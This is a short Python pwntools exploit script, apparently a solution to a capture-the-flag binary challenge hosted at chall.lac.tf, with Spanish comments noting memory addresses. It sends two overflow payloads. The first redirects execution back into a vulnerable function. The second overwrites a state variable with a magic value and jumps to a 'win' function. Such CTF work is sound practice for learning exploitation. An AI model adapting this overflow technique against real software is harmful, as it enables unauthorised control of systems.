from pwn import *

gs = '''
break *vuln
continue
'''

elf = context.binary = ELF("./chall")

def start():
    if args.REMOTE:
        return remote("chall.lac.tf", 31593)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

io.recv()

buf_address = 0x404040

"""
Centrate en esto:
pwndbg> 
0x404538 <buf+1272>:	0x0000000000000000 (Aqui)
pwndbg> 
0x404540 <state>:	0x0000000000000000   (El target)
pwndbg> 
0x404548:	0x0000000000000000 (Aqui empezamos la sobrescritura)
pwndbg> 
0x404550:	0x0000000000000000
pwndbg> 
0x404558:	0x0000000000000000
pwndbg> 


"""

payload = b"".join([
    p64(buf_address + 1272 + 16).rjust(40, b"A"), # buf+1272
    p64(elf.sym.vuln+12)
])

io.send(payload)

payload = b"".join([
    b"A"*23,
    p64(0xf1eeee2d),
    b"A"*8,
    p64(elf.sym.win)
])

io.send(payload)

io.interactive()